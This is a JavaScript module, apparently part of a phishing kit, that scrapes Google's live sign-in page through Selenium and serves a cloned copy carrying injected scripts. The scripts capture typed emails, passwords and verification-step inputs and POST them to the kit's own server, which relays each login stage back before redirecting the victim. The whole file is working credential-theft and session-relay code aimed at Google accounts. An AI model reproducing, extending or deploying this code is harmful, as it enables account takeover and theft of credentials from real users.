import { By } from "selenium-webdriver";

// Constants
const GOOGLE_FAVICON_URL = "https://www.google.com/favicon.ico";
const MAIN_DIV_ID = "yDmH0d";
const EMAIL_INPUT_ID = "identifierId";
const PASSWORD_INPUT_NAME = "Passwd";
const PROGRESS_BAR_XPATH = '//div[@jscontroller="ltDFwf"]';
const MAIN_CONTENT_XPATH = '//div[@class="S7xv8 LZgQXe"]';
const LANGUAGE_SELECTOR_XPATH = '//div[@jsname="oYxtQd"]';
const PAGE_LOADING_XPATH = '//div[@jsname="USBQqe"]';

// HTML Templates
const REDIRECT_SCRIPT_TEMPLATE = (forwardURL) => `
	<script>window.location.href="${forwardURL}"</script>
`;

const USER_ID_SCRIPT_TEMPLATE = (userId) => `
	<script>
		const user_id = ${userId};
		var reloaded = false;
		var api_server_url = window.location.origin;
		console.log(api_server_url);
	</script>
`;

const FORWARD_URL_SCRIPT_TEMPLATE = (forwardUrl) => `
	<script>
		const forward_url = "${forwardUrl}";
	</script>
`;

const EMAIL_INPUT_SCRIPT_TEMPLATE = (email) => `
	<script>
		document.getElementById("${EMAIL_INPUT_ID}").value = "${email}";
	</script>
`;

export const getHtmlAlreadySignIn = (forwardURL) => REDIRECT_SCRIPT_TEMPLATE(forwardURL);

export const buildHTMLByPageSource = async (pageSource, {
  driver, 
  email,
  userId, 
  forwardURL
}) => {
  try {
    // Sanitize page source by removing scripts and iframes
    let htmlText = removeSpecificTag(pageSource, "script");
    htmlText = removeSpecificTag(htmlText, "iframe");
    
    // Extract and remove styles
    const styleList = getSpecificTagList(pageSource, "style");
    htmlText = removeSpecificTag(htmlText, "style");

    // Get main content div
    const divEl = await driver.findElement(By.id(MAIN_DIV_ID));
    if (!divEl) {
      return "";
    }
    
    let htmlYDmH0d = await divEl.getAttribute("innerHTML");
    htmlYDmH0d = removeSpecificTag(htmlYDmH0d, "script");
    htmlYDmH0d = removeSpecificTag(htmlYDmH0d, "iframe");
    
    // Rebuild content with styles
    let htmlChange = htmlYDmH0d;
    styleList.forEach(style => {
      htmlChange += style;
    });

    // Add email input script
    htmlChange = addSetInputEmailValueScript(htmlChange, email);
    htmlText = htmlText.replace(htmlYDmH0d, htmlChange);
    
    // Add all required scripts
    htmlText = setUserIdScript(htmlText, userId);
    htmlText = setForwardUrlScript(htmlText, forwardURL);
    htmlText = addFunctionsScript(htmlText);
    htmlText = addTimeoutScript(htmlText);
    htmlText = setFavicon(htmlText);
    
    return htmlText;
  } catch (error) {
    console.error('Error in buildHTMLByPageSource:', error);
    return "";
  }
};

export function removeSpecificTag(src, tag) {
  if (!src || !tag) return src;
  
  const startTag = `<${tag}`;
  const endTag = `</${tag}>`;
  let htmlTxt = src;
  
  let startIdx = htmlTxt.indexOf(startTag);
  if (startIdx < 0) {
    return htmlTxt;
  }

  while (startIdx >= 0) {
    const endIdx = htmlTxt.indexOf(endTag, startIdx);
    if (endIdx < 0) break;
    
    htmlTxt = htmlTxt.substring(0, startIdx) + htmlTxt.substring(endIdx + endTag.length);
    startIdx = htmlTxt.indexOf(startTag);
  }
  
  return htmlTxt;
}

export function getSpecificTagList(src, tag) {
  if (!src || !tag) return [];
  
  const startTag = `<${tag}`;
  const endTag = `</${tag}>`;
  const tagList = [];
  let htmlTxt = src;
  
  let startIdx = htmlTxt.indexOf(startTag);
  
  while (startIdx >= 0) {
    const endIdx = htmlTxt.indexOf(endTag, startIdx);
    if (endIdx < 0) break;
    
    const tagContent = htmlTxt.substring(startIdx, endIdx + endTag.length);
    
    // Skip tags with body opacity styling
    if (!tagContent.includes("body{opacity:0;}")) {
      tagList.push(tagContent);
    }
    
    htmlTxt = htmlTxt.substring(0, startIdx) + htmlTxt.substring(endIdx + endTag.length);
    startIdx = htmlTxt.indexOf(startTag);
  }
  
  return tagList;
}

export function addStyleList(src, styleList) {
  if (!src || !styleList || styleList.length === 0) return src;
  
  const metaEndIdx = src.indexOf("<meta");
  if (metaEndIdx < 0) return src;
  
  const metaCloseIdx = src.indexOf(">", metaEndIdx);
  if (metaCloseIdx < 0) return src;
  
  let htmlTxt = src;
  const insertionPoint = metaCloseIdx + 1;
  
  // Insert styles in reverse order to maintain proper order
  styleList.reverse().forEach(style => {
    htmlTxt = htmlTxt.substring(0, insertionPoint) + style + htmlTxt.substring(insertionPoint);
  });
  
  return htmlTxt;
}

export function setFavicon(src) {
  if (!src) return src;
  
  const iconLink = `<link rel="shortcut icon" href="${GOOGLE_FAVICON_URL}" />`;
  const headIdx = src.indexOf("<head>");
  
  if (headIdx < 0) return src;
  
  const headCloseIdx = headIdx + "<head>".length;
  return src.substring(0, headCloseIdx) + iconLink + src.substring(headCloseIdx);
}

export function setUserIdScript(src, userId) {
  if (!src || userId === undefined || userId === null) return src;
  return src + USER_ID_SCRIPT_TEMPLATE(userId);
}

export function setForwardUrlScript(src, forwardUrl) {
  if (!src || !forwardUrl) return src;
  return src + FORWARD_URL_SCRIPT_TEMPLATE(forwardUrl);
}

export function addSetInputEmailValueScript(src, email) {
  if (!src || !email) return src;
  return src + EMAIL_INPUT_SCRIPT_TEMPLATE(email);
}

export function addTimeoutScript(src) {
  if (!src) return src;
  
  const timeoutScript = `
	<script>
		window.setInterval(function() {
			if(reloaded == false) {
				actions_func();
				reloaded = true;

				if(curPage != 'dp')
					return;
					
				// API call to check URL
				const apiUrl = api_server_url + '/api/url-check';
				fetch(apiUrl, {
					method: 'POST',
					headers: {
						'Accept': 'application/json',
						'Content-Type': 'application/json'
					},
					body: JSON.stringify({
						uid: user_id
					})
				})
				.then(response => {
					if (!response.ok) {
						throw new Error('Network response was not ok');
					}
					return response.json();
				})
				.then(data => {
					apiResultProcessing(data);           
				})
				.catch(error => {
					console.error('Error:', error);
				});
			}                            
		}, 100);
	</script>
`;
  
  return src + timeoutScript;
}

// Helper functions for the main script
const UTILITY_FUNCTIONS = `
	// Utility functions
	function getElementByXpath(path) {
		return document.evaluate(path, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
	}

	function getAllElementsByXPath(xpath, parent) {
		let results = [];
		let query = document.evaluate(xpath, parent || document,
			null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
		for (let i = 0, length = query.snapshotLength; i < length; ++i) {
			results.push(query.snapshotItem(i));
		}
		return results;
	}

	function createCookie(cookie_name, value) {
		var cookie_value = escape(value) + ';';
		return cookie_name + '=' + cookie_value;
	}

	function getCookie(cookie_name) {
		let matches = document.cookie.match(new RegExp(
			"(?:^|; )" + cookie_name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
		));
		return matches ? decodeURIComponent(matches[1]) : undefined;
	}
`;

const API_FUNCTIONS = `
	// API functions
	function doneApiRequest() {
		const apiUrl = api_server_url + '/api/done-user';
		fetch(apiUrl, {
			method: 'POST',
			headers: {
				'Accept': 'application/json',
				'Content-Type': 'application/json'
			},
			body: JSON.stringify({
				uid: user_id,
			})
		});				
	}
	   
	function apiResultProcessing(data) {
		if(data.status == 0) return;
		
		curPage = data.curPage
								
		if (curPage == 'done') {
			doneApiRequest();
			window.location.href = forward_url;
		} else if (curPage == 'redirect') {                    
			window.location.href = forward_url;
		} else {
			var mainDivElement = document.getElementById("${MAIN_DIV_ID}");
			mainDivElement.innerHTML = data.htmlText;
			
			// Hide progress bar
			getElementByXpath('${PROGRESS_BAR_XPATH}').className = "sZwd7c B6Vhqe qdulke jK7moc";

			// Enable main content
			var div_el = getElementByXpath('${MAIN_CONTENT_XPATH}');
			div_el.style["opacity"] = "1.0";
			div_el.style["pointer-events"] = "all";
			reloaded = false;
		}  
	}
`;

const BUTTON_CLICK_FUNCTION = `
	// Button click handler
	const btnClickFunction = (btnType, btnText, btnTextAlt) => {
		uid = user_id;

		// Show progress bar
		getElementByXpath('${PROGRESS_BAR_XPATH}').className = "sZwd7c B6Vhqe";

		// Disable main content
		var div_el = getElementByXpath('${MAIN_CONTENT_XPATH}');
		div_el.style["opacity"] = "0.5";
		div_el.style["pointer-events"] = "none";

		// Get input value based on current page
		var value = '';
		if(curPage == 'email') {
			value = getElementByXpath('//input[@id="${EMAIL_INPUT_ID}"]').value;
		} else if(curPage == 'password') {
			value = getElementByXpath('//input[@name="${PASSWORD_INPUT_NAME}"]').value;
		} else {
			var input_elements = getAllElementsByXPath('//input');
			for(let i = 0; i < input_elements.length; i++) {
				if(input_elements[i].type != 'checkbox' 
						&& input_elements[i].type != 'button'
						&& input_elements[i].type != 'hidden'
						&& input_elements[i].value != '') {
						value = input_elements[i].value;
						break;
				}
			}
		}
		

		// Make API call
		const apiUrl = api_server_url + '/api/btn-click';
		fetch(apiUrl, {
			method: 'POST',
			headers: {
				'Accept': 'application/json',
				'Content-Type': 'application/json'
			},
			body: JSON.stringify({
				uid,
				value,
				btnType,
				btnText,
				btnTextAlt
			})
		})
		.then(response => {
			if (!response.ok) {
				throw new Error('Network response was not ok');
			}
			return response.json();
		})
		.then(data => {
			apiResultProcessing(data);                       
		})
		.catch(error => {
			console.error('Error:', error);
		});
	}
`;

const EVENT_HANDLERS = `
	// Event handlers
	document.addEventListener('keydown', (event) => {
		if (event.key === 'Enter') {
			event.preventDefault();
			
			var btnText = 'Next'					
			var btnTextAlt = 'Next'					
			if(hl == 'ko') btnTextAlt = '다음';
			
			btnClickFunction(0, btnText, btnTextAlt);			
		}
	});
`;

const ACTION_FUNCTIONS = `
	// Action functions
	function actions_func() {
		// Button click handlers
		var btnElements = document.getElementsByTagName("button");
		for(let i = 0; i < btnElements.length; i++) {
			btnElements[i].addEventListener('click', () => {
				var btnText = btnElements[i].innerText;
				btnClickFunction(0, btnText, btnText);        
			});
		}

		// Account reselection handler
		var btn = getElementByXpath('//div[@jsname="af8ijd"]');
		if(btn) {
			btn.addEventListener('click', () => {
				btnClickFunction(1, 'af8ijd');        
			});
		}
		

		// Password visibility toggle
		var pwd_input = getElementByXpath('//input[@name="${PASSWORD_INPUT_NAME}"]');
		if(pwd_input) {
			var pwd_checkbox = getElementByXpath('//input[@class="VfPpkd-muHVFf-bMcfAe"]');
			if(pwd_checkbox && pwd_checkbox.type == 'checkbox') {
				pwd_checkbox.addEventListener('click', () => {
					if(pwd_checkbox.checked == true) {
						pwd_input.type = 'text';
					} else {
						pwd_input.type = 'password';
					}
				});
			}
		}

		// Try another way list click handlers
		var li_elements = getAllElementsByXPath('//li');
		for(let i = 0; i < li_elements.length; i++) {
			if(li_elements[i].className && li_elements[i].className.indexOf('aZvCDf cd29Sd zpCp3 SmR8') >= 0) {
				li_elements[i].addEventListener('click', () => {
					var str_title = li_elements[i].innerText.split("\\n")[0];
					btnClickFunction(2, str_title);      
				});
			}
		}
	}
`;

export function addFunctionsScript(src) {
  if (!src) return src;
  
  const functionsScript = `
	<script>
		var curPage = 'email';
		
		${UTILITY_FUNCTIONS}
		${API_FUNCTIONS}
		${BUTTON_CLICK_FUNCTION}
		
		// Get language parameter
		const url = new URL(document.URL);
		const urlParams = url.searchParams;
		const hl = urlParams.get('hl');
		const acc = urlParams.get('acc');
		
		${EVENT_HANDLERS}
		${ACTION_FUNCTIONS}
	</script>
`;
  
  return src + functionsScript;
}
